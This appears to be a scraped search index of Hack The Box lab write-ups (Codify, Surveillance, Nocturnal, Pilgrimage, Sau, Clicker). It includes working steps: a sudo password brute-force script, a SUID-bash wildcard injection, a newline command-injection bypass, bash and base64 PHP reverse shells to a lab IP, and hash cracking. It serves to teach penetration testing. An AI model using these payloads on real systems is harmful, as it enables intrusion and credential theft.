Look at Google for vm2 escape, found this payload: https://security.snyk.io/vuln/SNYK-JS-VM2-5537100  Prepared the script a bit and got it, then send a reverse shell and we're in as svc user and then improve to a good shell.  Found the user joshua on /etc/passwd.  Checking the contents of the server, there's the contact folder which looks like an old nodejs app. It has a sqlite database which contains a users table with an entry for joshua. Let's try to crack the bcrypt hash stored there.  hashcat exfil/hash -m 3200 -a 0 /usr/share/wordlists/rockyou.txt   Found the password for user joshua, now connect with SSH, and we're in and get can get the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Codify","url":"/docs/write-up/htb/machines/easy/codify#privilege-escalation","content":" The user joshua can execute this command as root:  joshua@codify:~$ sudo -l [sudo] password for joshua: Matching Defaults entries for joshua on codify: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User joshua may run the following commands on codify: (root) /opt/scripts/mysql-backup.sh   In that script, there's one if statement that checks the user input password with the credentials stored in one file:  if [[ $DB_PASS == $USER_PASS ]]; then   The problem with that is, this if does not perform string comparison, it performs pattern matching. Which means that it USER_PASS is *, the if will pass.  The pattern matching will work with any character, for instance let's say the password is password, if the user provides the password p* it will pass, so we can slowly bruce-force each character thanks to pattern matching with the following script:  import string import subprocess import time all_characters = list(string.ascii_letters + string.digits) password = &quot;&quot; while True: for char in all_characters: command = f&quot;echo '{password}{char}*' | sudo /opt/scripts/mysql-backup.sh&quot; output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout if &quot;Password confirmed&quot; in output: password += char print(password) time.sleep(1)   And found the password for root, now we can run su and provide that password and we got root access. ","version":"Next","tagName":"h2"},{"title":"Campfire 1","type":0,"sectionRef":"#","url":"/docs/write-up/htb/sherlocks/campfire1","content":"Campfire 1 https://app.hackthebox.com/sherlocks/737 Alonzo Spotted Weird files on his computer and informed the newly assembled SOC Team. Assessing the situation it is believed a Kerberoasting attack may have occurred in the network. It is your job to confirm the findings by analyzing the provided evidence. You are provided with: 1- Security Logs from the Domain Controller 2- PowerShell-Operational Logs from the affected workstation 3- Prefetch Files from the affected workstation https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/https://www.hackthebox.com/blog/kerberoasting-attack-detectionhttps://techantidote.com/dfir-analyze-windows-event-logs-evtx-from-a-linux-machine-using-sigma-rules-chainsaw-and-evtx-dump/https://www.hackingarticles.in/forensic-investigation-prefetch-file/https://ericzimmerman.github.io/#!index.md Install: https://github.com/WithSecureLabs/chainsaw a tool to search what happened inside Windows Forensic artifactshttps://github.com/SigmaHQ/sigma rules to detect threatshttps://ericzimmerman.github.io/#!index.md And execute chainsaw to analyze the event logs: ./chainsaw hunt ~/workspace/gal/htb/Sherlocks/Campfire-1/Triage/Domain\\ Controller -s ~/workspace/tools/sigma --mapping mappings/sigma-event-logs-all.yml -r ~/workspace/tools/sigma/rules --csv --output ~/workspace/gal/htb/Sherlocks/Campfire-1/Triage/Domain\\ Controller/chainsaw To analyze prefetch files, we'll move to a Windows VM. There use pecmd application (from https://ericzimmerman.github.io/#!index.md) to generate the CSV: .\\PECmd.exe -d C:\\Users\\gal\\Desktop\\campfire1\\Workstation\\2024-05-21T033012_triage_asset\\ --csv . --csvf C:\\Users\\gal\\Desktop\\prefetch.csv Now, we'll use the Timeline explorer tool (from https://ericzimmerman.github.io/#!index.md) to analyze the csv","keywords":"","version":"Next"},{"title":"Surveillance","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/medium/surveillance","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Surveillance","url":"/docs/write-up/htb/machines/medium/surveillance#enumeration","content":" 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Surveillance |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   ubuntu jammy running nginx 1.18.0  Browsing the web, we can see the following link: https://github.com/craftcms/cms/tree/4.4.14. Looks like it's made with craftcms and we have the precise version.  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Surveillance","url":"/docs/write-up/htb/machines/medium/surveillance#foothold","content":" Looks like it's vulnerable to a RCE vulnerability (fixed by 4.4.15):  https://putyourlightson.com/articles/critical-craft-cms-security-vulnerabilityhttps://blog.calif.io/p/craftcms-rcehttps://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226  With latest POC, we got foothoold, now we can run a reverse shell, improve it and start investigating.  Right now we can acess as wwww-data.  ","version":"Next","tagName":"h2"},{"title":"Lateral movement​","type":1,"pageTitle":"Surveillance","url":"/docs/write-up/htb/machines/medium/surveillance#lateral-movement","content":" In home we found two users:  www-data@surveillance:~/html/craft/web/cpresources$ ls /home matthew zoneminder   There are many things listening in localhost:  www-data@surveillance:~/html/craft$ netstat -na |grep &quot;LISTEN&quot; tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN tcp6 0 0 :::22 :::* LISTEN   Looks like there's a ZoneMinder server running in port 8080 but only listening in localhost. Looks really interesting for later.  I managed to exfiltrate the contents of /var/www and found the configuration to connect to mysql database which contains an entry for admin user:  MariaDB [craftdb]&gt; select username,fullName,password from users; +----------+-----------+--------------------------------------------------------------+ | username | fullName | password | +----------+-----------+--------------------------------------------------------------+ | admin | Matthew B | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe | +----------+-----------+--------------------------------------------------------------+   If we manage to crack the hash, we might get the password of matthew user. Checking the contents, of the web there's a backup of the database which contains a different hash, it might be worth trying to crack it.  Crack it, got the user password for matthew: Looks like there's a ZoneMinder server running in port 8080 but only listening in localhost. Looks really interesting for later.  I managed to exfiltrate the contents of /var/www and found the configuration to connect to mysql database which contains an entry for admin user:  MariaDB [craftdb]&gt; select username,fullName,password from users; +----------+-----------+--------------------------------------------------------------+ | username | fullName | password | +----------+-----------+--------------------------------------------------------------+ | admin | Matthew B | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe | +----------+-----------+--------------------------------------------------------------+   If we manage to crack the hash, we might get the password of matthew user. Checking the contents, of the web there's a backup of the database which contains a different hash, it might be worth trying to crack it.  Crack it, got the user password for matthew. Now we can connect with SSH and read the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Surveillance","url":"/docs/write-up/htb/machines/medium/surveillance#privilege-escalation","content":" The user cannot run sudo. Now that we have SSH access, we can do port forwarding to access the instance running in localhost:  ssh -L 8080:localhost:8080 matthew@surveillance.htb   We can have access to the ZoneMinder thing by using the user admin and the same password as matthew.  Now we can see the version: v1.36.32  Looks like it's vulnerable to https://pentest-tools.com/vulnerabilities-exploits/zoneminder-snapshots-command-injection_22437 because it mentions prior versions to 1.36.33 and 1.37.33  Since the process does not appear for the user matthew, it might be running for another user or for root. Either way, we can try to exploit the RCE vulnerability and continue from there.  The POC worked perfectly and we got access to user zoneminder. Now let's improve the shell and continue.  Checking what the user can do, looks like it can execute some script as root without specifying a password:  zoneminder@surveillance:~$ sudo -l Matching Defaults entries for zoneminder on surveillance: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User zoneminder may run the following commands on surveillance: (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl * zoneminder@surveillance:~$   This means any user can run any binary called zm*.pl in the /usr/bin/ directory under the root context, no password will be prompted. Morevoer, any option can be passed to the binary since it uses a wildcard in the sudoers file. This is a wide open configuration which can be abused using wildcard injection. Prepare a shell exploit.  echo 'cp /bin/bash /var/tmp/bash;chmod 4755 /var/tmp/bash' &gt; /var/tmp/exploit.sh chmod +x /var/tmp/exploit.sh   Now just run any zm* binary and inject a command calling the exploit, it will be executed under the root context. For example, using zmupdate with the --version option will force the tool to upgrade the database, and it allows us to inject a command to execute the exploit:  sudo /usr/bin/zmupdate.pl --version=1 --user='$(/var/tmp/exploit.sh)'   Now execute the copied bash with -p and we got root access. ","version":"Next","tagName":"h2"},{"title":"Nocturnal","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/nocturnal","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Nocturnal","url":"/docs/write-up/htb/machines/easy/nocturnal#enumeration","content":" nmap:  └─$ nmap 10.10.11.64 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 20:56 CEST Nmap scan report for 10.10.11.64 Host is up (0.039s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds   Whatweb:  whatweb nocturnal.htb http://nocturnal.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0]   Discovering folders with fuff, we found that nginx is returning 403 or 301 for the following folders:  backupsuploadsuploads2  This might be useful for later.  In the website we see: Please login or register to start uploading and viewing your files.  When you upload a file, you can see the URL is http://nocturnal.htb/view.php?username=test%40test.htb&amp;file=test.pdf  We can try to abuse this to list files.  Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.  If you register two users and upload different files, and you try to access same file from both accounts, you will discover that, i you send a valid username but invalid file, you'll get a list of the files uploaded for that username, e.g:  http://nocturnal.htb/view.php?username=test@test.htb&amp;file=test2.pdf  So, we need a way of enumerating users. We can enumerate users with fuff and SecLists:  ffuf -w /opt/github/SecLists/Usernames/Names/names.txt:FUFF -u &quot;http://nocturnal.htb/view.php?username=FUFF&amp;file=test.pdf&quot; -H &quot;Cookie: PHPSESSID=xxx&quot; -fw 1170   Take into account that we need to be authenticated to perform the IDOR (Insecure Direct Object Reference) attack. To simulate authentication, we can pass a cookie to fuff. The following users have been found:  admin [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 31ms] amanda [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 33ms] kevin [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 31ms] tobias [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 31ms]   Amanda has a file named privacy.odt. The password for amanda is in that file. Trying to ssh to the machine with amanda user and password failed; but we can access the website and have access to the admin panel.  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Nocturnal","url":"/docs/write-up/htb/machines/easy/nocturnal#foothold","content":" Now we have access to the source code and we have a form to create and access backups. We see there are two folders: uploads and backups shown in the Admin panel. The admin panel only shows php files, but if we create a backup we'll have access to the uploads content.  The URL format of the backup is http://nocturnal.htb/backups/backup_2025-08-17.zip. We can try to bruteforce the backup folder and see if we find something interesting. Nothing found ...  However, checking the code of the create backup function, a potential command injection is found via the password file  $command = &quot;zip -x './backups/*' -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; . &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;;   However, the password input is cleaned:  function cleanEntry($entry) { $blacklist_chars = [';', '&amp;', '|', '$', ' ', '`', '{', '}', '&amp;&amp;']; foreach ($blacklist_chars as $char) { if (strpos($entry, $char) !== false) { return false; // Malicious input detected } } return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8'); }   After messing around, I found a way to bypass the cleaning function: use newline character to execute different commands, e.g:  ls id   Newline character is not cleaned up from the user input. Since we have access to the source code, we can prepare an experiment to see if we can bypass the limitation with \\n:  $entry=&quot;1\\nid&gt;/tmp\\n&quot;; $password = cleanEntry($entry);   Since we want to retrieve the output of the id command, we need to force an error. In the legitimate command, stdout and stderr are redirected to a log:  $command = &quot;zip -x './backups/*' -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; . &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;;   The only thing now missing is testing it via the UI. However, due to the nature of the HTML components, looks like the password is not sent to the PHP endpoint as we want. Instead, we can rely to manual execution with curl.  If we try to send \\n char our command injection will fail, however, we can send the url-encoded version of the payload:  password=1%0Aid&gt;/tmp%0A&amp;backup=   In the same way, we can leverage \\t instead of .  And we will see the contents of the id command in the returned logs.  Now, we can try to create a reverse shell abusing of this RCE. Since there are a lot of restrictions on the command injection, we'll build the reverse shell payload locally and upload it to the target.  Go to revshells.comWrite the reverse shell to a file in the attacker machine  echo 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.173/9001 0&gt;&amp;1&quot;' &gt; payload   Download the payload in the victim machine. Pass the command injection with a payload that will execute:  curl 10.10.14.173:8000/shell -o payload   This will download the payload to same directory 4. Check if the payload has been downloaded:  ls -l payload   Execute the payload:  bash payload   And we'll have a very nice shell into the machine with user www-data.  ","version":"Next","tagName":"h2"},{"title":"Lateral movement​","type":1,"pageTitle":"Nocturnal","url":"/docs/write-up/htb/machines/easy/nocturnal#lateral-movement","content":" An SQLite database is found with www-data ownership. Let's exfiltrate it.  In the database there's a bunch of users/hashes. According to hashcat, they are md4 hashes.  Let's crack them:  hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt   And we find the password for user tobias.  We can now connect and retrieve the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Nocturnal","url":"/docs/write-up/htb/machines/easy/nocturnal#privilege-escalation","content":" There's a bunch of application listening in localhost:  tobias@nocturnal:~$ netstat -putona (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name Timer tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN - off (0.00/0/0) tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN - off (0.00/0/0) tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - off (0.00/0/0) tcp 0 0 127.0.0.1:587 0.0.0.0:* LISTEN - off (0.00/0/0) tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN - off (0.00/0/0) tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - off (0.00/0/0) tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - off (0.00/0/0) tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - off (0.00/0/0) tcp6 0 0 :::22 :::* LISTEN - off (0.00/0/0) udp 0 0 127.0.0.53:53 0.0.0.0:* - off (0.00/0/0)   In port 8080, it's something called ISPConfig. More info here: https://en.wikipedia.org/wiki/ISPConfig  Tried a SSH port forwarding the application complained about a possible attack. Most likely, there's something that checks the hostname. We can modify /etc/hosts in our attacker machine to tell that nocturnal.htb now points to localhost.  We can log in as admin - the password cracked for tobias.  Trying to determine the version of the running ISPConfig.  Come across some vulnerabilities:  https://github.com/ajdumanhug/CVE-2023-46818  It will exploit versions of ISPConfig &lt;= 3.2.11 and we've got ISPConfig Version: 3.2.10p1  We are lucky, looks like it will be affected  The poc will give us access to a ispconfig-shell as root. Looks like we cannot escape current directory, but, we can run a reverse shell from there that will give us full root access and we will be able to retrieve the flag. ","version":"Next","tagName":"h2"},{"title":"Pilgrimage","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/pilgrimage","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Pilgrimage","url":"/docs/write-up/htb/machines/easy/pilgrimage#enumeration","content":" Open ports: 80 and 22  22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http nginx 1.18.0   └──╼ $whatweb pil.htb http://pil.htb [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.219], JQuery, Script, Title[Pilgrimage - Shrink Your Images], nginx[1.18.0]   It's using PHP, the service looks useful to shrink images, it has a form where you upload an image and it will generate a new link with the shrink verion.  Brute-forcing the directory, we can see the webserver exposes the .git folder. Let's try to retrieve the code from there.  We can dump the exposed git folder and reconstruct the sources using https://github.com/arthaud/git-dumper  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Pilgrimage","url":"/docs/write-up/htb/machines/easy/pilgrimage#foothold","content":" Checking the code, we observe a potential command injection here:   $mime = &quot;.png&quot;; $imagePath = $upload-&gt;getFullPath(); if(mime_content_type($imagePath) === &quot;image/jpeg&quot;) { $mime = &quot;.jpeg&quot;; } $newname = uniqid(); exec(&quot;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&quot; . $upload-&gt;getName() . $mime . &quot; -resize 50% /var/www/pilgrimage.htb/shrunk/&quot; . $newname . $mime);   We can abuse the exec by breaking the cmd using:  $upload-&gt;getName()$mime$newname  $mime and $newname are not controlled by the user, which left us only $upload-&gt;getName() to try the command injection. getName cannot be abused because the value does not depend on the user.   /** * @param array $_files represents the $_FILES array passed as dependency */ public function __construct(array $_files = array()) { if (!function_exists('exif_imagetype')) { $this-&gt;error = 'Function \\'exif_imagetype\\' Not found. Please enable \\'php_exif\\' in your php.ini'; } $this-&gt;_files = $_files; }   The construct only reads $_FILES and set it to the variable, name cannot be abused.  Looks like the service is using imagemagick to do the shrinking, we have the binary, so we can extract the version from an x64_86 computer (same arch as the binary):  ./magick --version 7.1.0-49   If we search for vulnerabilities for that library, we'll find something interesting: https://www.uptycs.com/blog/denial-of-servicedos-and-arbitrary-file-read-vulnerability-in-imagemagick.  There's a very nice explanation on how to exploit this vulnerability. After exploiting this we can read the /etc/passwd and identify a user named emily.  Tried to search for some flags inside the home with no luck. Tried to get SSH keys without any luck.  Going back to the source code, we see that there's a dashboard querying a database, we can try to download that database  Decoded hex string: b'SQLite format 3\\x00\\x10\\x00\\x01\\x01\\x00@ \\x   Looks like we got it, we'll need to tweak the format a bit.  We need to pass the hex bytes to actual bytes and we'll retrieve the whole sqlite database where there's a table with username-password and the password for emily is there, later we can connect with SSH and we're in as emily. Now we can read the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Pilgrimage","url":"/docs/write-up/htb/machines/easy/pilgrimage#privilege-escalation","content":" For privilege escalation, looks like the user emily can execute the magick command which belongs to root:  emily@pilgrimage:/var/www/pilgrimage.htb$ ls -lisa |grep &quot;magick&quot; 43806 26912 -rwxr-xr-x 1 root root 27555008 Feb 15 2023 magick   Analyzing the processes, we see an interesting script executed as root:  #!/bin/bash blacklist=(&quot;Executable script&quot; &quot;Microsoft executable&quot;) /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do filename=&quot;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo &quot;$FILE&quot; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')&quot; binout=&quot;$(/usr/local/bin/binwalk -e &quot;$filename&quot;)&quot; for banned in &quot;${blacklist[@]}&quot;; do if [[ &quot;$binout&quot; == *&quot;$banned&quot;* ]]; then /usr/bin/rm &quot;$filename&quot; break fi done done   Looks like this is performing some kind of scan of the files uploaded and uses the binwalk python module which analyse the uploaded file:  emily@pilgrimage:~$ binwalk -e /var/www/pilgrimage.htb/shrunk/6516e94e5aa54.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 7 x 7, 8-bit colormap, non-interlaced   The binary is just a convenient alias to the binwalk python library.  This looks promising...  From the very same github page of the project, there's a security warning:  Prior to Binwalk v2.3.3, extracted archives could create symlinks which point anywhere on the file system, potentially resulting in a directory traversal attack if subsequent extraction utilties blindly follow these symlinks. More generically, Binwalk makes use of many third-party extraction utilties which may have unpatched security issues; Binwalk v2.3.3 and later allows external extraction tools to be run as an unprivileged user using the run-as command line option (this requires Binwalk itself to be run with root privileges). Additionally, Binwalk v2.3.3 and later will refuse to perform extraction as root unless --run-as=root is specified.   Here we are dealing with binwalk v2.3.2, so it contains this vulnerability.  More details about the vulnerability:  https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/https://github.com/electr0sm0g/CVE-2022-4510  The idea is to generate the payload to open a connection and upload it via SCP with the emily user. If we upload it via the web it will not open the connection since the image generated by convert, will not have the malicious payload to abuse binwalk. ","version":"Next","tagName":"h2"},{"title":"Sau","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/easy/sau","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Sau","url":"/docs/write-up/htb/machines/easy/sau#enumeration","content":" Initial scan shows some open ports:  └──╼ $nmap sau.htb -oA scans/initial_scan -Pn -n Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 19:10 BST Nmap scan report for sau.htb (10.10.11.224) Host is up (0.14s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp filtered http 55555/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 20.00 seconds   Port 80 is behind a firewall.  SSH:  └──╼ $nmap sau.htb -oA scans/ssh_scan -Pn -n -p22 -sC -sV Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 19:11 BST Nmap scan report for sau.htb (10.10.11.224) Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 4.73 seconds   We are dealing with an ubuntu focal.  55555: The nmap is taking a lot of time in determining the service. However, if we curl the port, we can see that it's a webserver:  └──╼ $curl -vvv sau.htb:55555 * Trying 10.10.11.224:55555... * Connected to sau.htb (10.10.11.224) port 55555 (#0) &gt; GET / HTTP/1.1 &gt; Host: sau.htb:55555 &gt; User-Agent: curl/7.88.1 &gt; Accept: */* &gt; &lt; HTTP/1.1 302 Found &lt; Content-Type: text/html; charset=utf-8 &lt; Location: /web &lt; Date: Wed, 27 Sep 2023 18:17:35 GMT &lt; Content-Length: 27 &lt; &lt;a href=&quot;/web&quot;&gt;Found&lt;/a&gt;.   The result from nmap came back and say that it cannot determine the service. We can see that if has something to do with baskets:  | invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$   If we curl the home page, we can see something interesting:   &lt;small&gt; Powered by &lt;a href=&quot;https://github.com/darklynx/request-baskets&quot;&gt;request-baskets&lt;/a&gt; | Version: 1.2.1 &lt;/small&gt;   Checking the website source code from the browser, we can see that there's a basket API which used a &quot;Master token&quot; for auth.   $.ajax({ method: &quot;POST&quot;, url: &quot;/api/baskets/&quot; + basket, headers: { &quot;Authorization&quot; : sessionStorage.getItem(&quot;master_token&quot;) }   After reading a bit, looks like the service is a server used to display HTTP requests  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Sau","url":"/docs/write-up/htb/machines/easy/sau#foothold","content":" Knowing the service and version, we can search for CVEs.  https://github.com/entr0pie/CVE-2023-27163  Looks like we can abuse of the request-baskets to access the webserver listening on port 80 but firewalled and...it's working:  ┌─[parrot@parrot]─[~/workspace/gal/htb/machines/sau/exploits] └──╼ $./CVE-2023-27163.sh http://sau.htb:55555/ http://127.0.0.1 Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163 &gt; Creating the &quot;zfqies&quot; proxy basket... &gt; Basket created! &gt; Accessing http://sau.htb:55555/zfqies now makes the server request to http://127.0.0.1. &gt; Authorization: sXxaCFrbUXtDv3qiltNRTbGju6JosLVH8fL2DkqyeiN9   └──╼ $curl -vvv http://sau.htb:55555/zfqies * Trying 10.10.11.224:55555... * Connected to sau.htb (10.10.11.224) port 55555 (#0) &gt; GET /zfqies HTTP/1.1 &gt; Host: sau.htb:55555 &gt; User-Agent: curl/7.88.1 &gt; Accept: */* &gt; &lt; HTTP/1.1 200 OK &lt; Cache-Control: no-cache &lt; Connection: close &lt; Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src * blob:; script-src 'self' 'unsafe-eval' https://stat.ripe.net; frame-src *; object-src 'none'; block-all-mixed-content; &lt; Content-Type: text/html &lt; Date: Thu, 28 Sep 2023 09:29:31 GMT &lt; Last-Modified: Tue, 31 Jan 2023 18:18:07 GMT &lt; Server: Maltrail/0.53 &lt; Transfer-Encoding: chunked &lt; &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no&quot;&gt; &lt;meta name=&quot;robots&quot; content=&quot;noindex, nofollow&quot;&gt;   In the firewalled webserver there's an instance of maltrail 0.53 service, which making a quick google search has a OS command injection vulnerability in the username field of the /login endpoint. There's even a metasploit module to explot it. See: https://packetstormsecurity.com/files/174221/Maltrail-0.53-Unauthenticated-Command-Injection.html  I've made some attempts with the bash and sh payloads from reverse shell and base64 encoded, also play around with data encoding (url encode, form encode, ...)  Finally I've made it work by using a python payload, base64 and form encoding.  We can read the user flag  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Sau","url":"/docs/write-up/htb/machines/easy/sau#privilege-escalation","content":" sudo -l shows that the user can execute systemctl status as any user (including root):  (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service   Let's search how to explot that in GTFO bins, looks like the default pager for systemctl is less, we can have access to root by just typing: !sh and voila!  We can read root flag. ","version":"Next","tagName":"h2"},{"title":"Clicker","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/medium/clicker","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Clicker","url":"/docs/write-up/htb/machines/medium/clicker#enumeration","content":" The machine has a NFS share sharing the source code  Checking the source code we see a potential SQL injection following a similar pattern of this:  https://phpdelusions.net/pdo/sql_injection_example  curl -vv 'http://clicker.htb/save_game.php?clicks=0&amp;level=0&amp;nickname=blabla' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh'  We can arbirtraryly change key-values in the database in the query, however, there's a explicit check to try to change the role:  \tforeach($_GET as $key=&gt;$value) { if (strtolower($key) === 'role') { // prevent malicious users to modify role header('Location: /index.php?err=Malicious activity detected!'); die; }   ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Clicker","url":"/docs/write-up/htb/machines/medium/clicker#foothold","content":" In order to avoid this, we need to mask the key somehow, an idea can be to bypass that restriction using CR-LF injection:  curl -vv 'http://clicker.htb/save_game.php?role%0a=Admin' -H 'Cookie: PHPSESSID=k002rk00q1d5v73c3nvjgabeie'   Now, we are admin in the PHP application and we can perform more enumerations.  We discovered some interesting pages:  admin.php: Generates a list with the top users.export.php: Generate a file exports/top_players_fwhb6q51, no more info. Maybe it's good to do user enumeration?diagnostic.php: Protected by a md5 token  We can access the generated files by the exporting function...  curl -vv 'http://clicker.htb/export.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=k002rk00q1d5v73c3nvjgabeie' --data-raw 'threshold=0&amp;extension=html'   We can change the extension to PHP.  curl -vv 'http://clicker.htb/export.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh' --data-raw 'threshold=0&amp;extension=php'   We can change the nickname of the user to execute arbitrary PHP code. We'll change the nickname to make execute the following PHP code:  &lt;?php $output = exec('id');echo &quot;$output&quot;;?&gt;   curl -vv 'http://clicker.htb/save_game.php?clicks=0&amp;level=0&amp;nickname=%3C%3Fphp%20echo%20%221234%22%3B%3F%3E' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh'   Now we can repeat the process but to run a reverse shell:  &lt;?php system(&quot;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjAvNDQ0NCAwPiYx|base64 -d|bash&quot;)?&gt;   curl -vv 'http://clicker.htb/save_game.php?clicks=0&amp;level=0&amp;nickname=%3C%3Fphp%20system%28%22echo%20c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjAvNDQ0NCAwPiYx%7Cbase64%20-d%7Cbash%22%29%3F%3E' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh'   We get a shell for the user www-data. We discovered a user named jack by checking /etc/passwd  ","version":"Next","tagName":"h2"},{"title":"Lateral movement​","type":1,"pageTitle":"Clicker","url":"/docs/write-up/htb/machines/medium/clicker#lateral-movement","content":" During enumeration we discover there are two files in /opt files:  monitor.sh: script that downloads the output of diagnostic.php, the user needs to be rootmanage/READMEmanage/executequery: binary file that setup up all the environment  Let's download it and analyse it using ghidra ...   iVar1 = atoi(*(char **)(param_2 + 8)); pcVar3 = (char *)calloc(0x14,1); switch(iVar1) { case 0: puts(&quot;ERROR: Invalid arguments&quot;); uVar2 = 2; goto LAB_001015e1; case 1: strncpy(pcVar3,&quot;create.sql&quot;,0x14); break; case 2: 